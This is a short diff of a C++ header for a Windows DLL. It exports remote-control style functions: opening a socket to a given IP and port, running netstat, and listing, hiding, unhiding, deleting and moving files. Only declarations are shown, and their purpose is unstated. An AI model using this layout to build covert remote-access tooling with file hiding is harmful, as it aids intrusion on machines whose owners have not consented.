@@ -28,14 +28,12 @@ extern "C" {
 	extern __declspec(dllexport) string RunNetstat(string nothing);
 	extern __declspec(dllexport) string GetAllFiles(string dir);
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
-	extern __declspec(dllexport) string HideFileOrFolder(string file);
-	extern __declspec(dllexport) string DeleteGivenFile(string file);
+	extern __declspec(dllexport) string ChangeFile(string file);
 #else
 	extern __declspec(dllexport) string RunNetstat(string nothing);
 	extern __declspec(dllexport) string GetAllFiles(string dir);
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
-	extern __declspec(dllexport) string HideFileOrFolder(string file);
-	extern __declspec(dllexport) string DeleteGivenFile(string file);
+	extern __declspec(dllexport) string ChangeFile(string file);
 
 #endif
 }
@@ -48,4 +46,8 @@ bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
 void CloseConnection(SOCKET s);
 void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles);
 string OpenSocketWithThread(std::string ip_and_port);
+string HideFileOrFolder(string file);
+string DeleteGivenFile(string file);
+string UnHideFileOrFolder(string pathtofileorfolder);
+string MoveGivenFileToDestination(string pathtofile, string Destination);
 #endif
